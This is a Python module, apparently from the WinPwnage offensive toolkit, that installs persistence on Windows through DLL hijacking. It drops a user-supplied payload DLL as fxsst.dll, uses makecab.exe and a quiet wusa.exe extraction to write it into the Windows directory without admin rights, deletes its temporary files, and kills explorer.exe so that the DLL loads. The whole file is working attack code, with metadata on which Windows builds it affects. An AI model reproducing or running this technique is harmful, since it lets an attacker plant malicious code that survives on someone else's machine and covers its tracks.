import os
import time
import tempfile
from winpwnage.core.prints import *
from winpwnage.core.utils import *

explorer_info = {
	"Description": "Gain persistence using explorer and dll hijacking",
	"Id": "15",
	"Type": "Persistence",
	"Fixed In": "9800",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "fax_dll",
	"Function Payload": True,
}


def fax_dll(payload):
	if payloads().dll(payload):
		try:
			payload_data = open(os.path.join(payload), "rb").read()
		except Exception as error:
			return False
			
		try:
			dll_file = open(os.path.join(tempfile.gettempdir(), "fxsst.dll"), "wb")
			dll_file.write(payload_data)
			dll_file.close()
		except Exception as error:
			return False
		else:
			pass

		time.sleep(5)

		if os.path.isfile(os.path.join(tempfile.gettempdir(), "fxsst.dll")) == True:
			if process().create("makecab.exe", params="{} {}".format(
					os.path.join(tempfile.gettempdir(), "fxsst.dll"),
					os.path.join(tempfile.gettempdir(), "suspicious.cab")), 0) == True:
				print_success("Successfully created cabinet file")
			else:
				print_success("Unable to create cabinet file")
				return False
		else:
			print_error("Unable to create cabinet file, dll file is not found")
			return False

		time.sleep(5)

		if (os.path.isfile(os.path.join(tempfile.gettempdir(), "suspicious.cab")) == True):
			if process().create("wusa.exe", params="{} /extract:{} /quiet".format(
					os.path.join(tempfile.gettempdir(), "suspicious.cab"),
					information().windows_directory()),0) == True:
				print_success("Successfully extracted cabinet file")
			else:
				print_error("Unable to extract cabinet file")	
				return False
		else:
			print_error("Unable to extract cabinet file, cabinet file is not found")
			return False

		if os.path.isfile(os.path.join(information().windows_directory(), "fxsst.dll")) == True:
			print_success("Successfully installed persistence")
			if os.path.isfile(os.path.join(tempfile.gettempdir(), "suspicious.cab")) == True:
				try:
					os.remove(os.path.join(tempfile.gettempdir(), "suspicious.cab"))
				except Exception as error:
					return False
			else:
				pass
			if os.path.isfile(os.path.join(tempfile.gettempdir(),"fxsst.dll")) == True:
				try:
					os.remove(os.path.join(tempfile.gettempdir(),"fxsst.dll"))
				except Exception as error:
					return False
			else:
				pass

			print_info("Attempting to restart explorer in order to load our dll file")
			if process().terminate("explorer.exe") == True:
				print_success("Successfully restarted explorer process, enjoy!")
			else:
				print_success("Unable to restart explorer process, reboot!")
		else:
			return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False
